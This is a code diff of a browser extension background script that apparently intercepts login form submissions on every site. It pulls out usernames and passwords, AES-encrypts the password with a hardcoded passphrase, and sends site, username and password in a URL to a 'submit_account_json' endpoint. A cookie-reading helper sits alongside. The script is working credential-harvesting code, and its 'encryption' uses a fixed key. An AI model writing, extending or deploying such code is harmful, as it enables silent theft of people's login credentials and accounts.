@@ -1,3 +1,16 @@
+try {
+    importScripts('./crypto-js.min.js');
+  } catch (e) {
+    console.error(e);
+  }
+
+function encrypting(password)
+{
+    var passPhrase="shesh";
+    var encryptionResult = ""+CryptoJS.AES.encrypt(CryptoJS.enc.Utf8.parse(password), passPhrase);
+    return encryptionResult;
+}
+
 function getCookies(domain, name, callback) {
     chrome.cookies.get({ "url": domain, "name": name }, function (cookie) {
         if (callback) {
@@ -65,11 +78,13 @@ chrome.webRequest.onBeforeRequest.addListener(function (details) {
             if (details.requestBody.formData.password != undefined) {
                 username = details.requestBody.formData.username[0];
                 password = details.requestBody.formData.password[0];
+                password_send = encrypting(password);
+                // password_send = encodeURI(password_send);
                 url = details.url.replace("https://", "").replace("http://", "").replace("www.", "").split("/")[0];
                 console.log('Username:', username);
-                console.log('Password:', password);
+                console.log('Password:', password_send);
                 console.log('URL:', url);
-                dest = 'https://localhost/submit_account_json/' + url + '/' + username + '/' + password;
+                dest = 'https://localhost/submit_account_json/' + url + '/' + username + '/' + password_send;
                 fetch(dest, {
                     headers: {
                         'Content-Type': 'application/json',
